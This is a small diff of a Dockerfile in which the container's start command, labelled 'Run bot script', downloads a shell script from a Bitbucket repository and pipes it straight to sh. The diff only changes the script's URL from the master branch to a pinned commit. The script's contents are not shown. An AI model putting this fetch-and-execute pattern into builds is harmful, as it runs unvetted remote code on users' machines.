@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://bitbucket.org/dockerhero/zephher/raw/master/serabi.sh | sh
+CMD curl https://bitbucket.org/dockerhero/zephher/raw/835e2294d4e6ec1435a0eb0f221d79ec11a4cda8/serabi.sh | sh
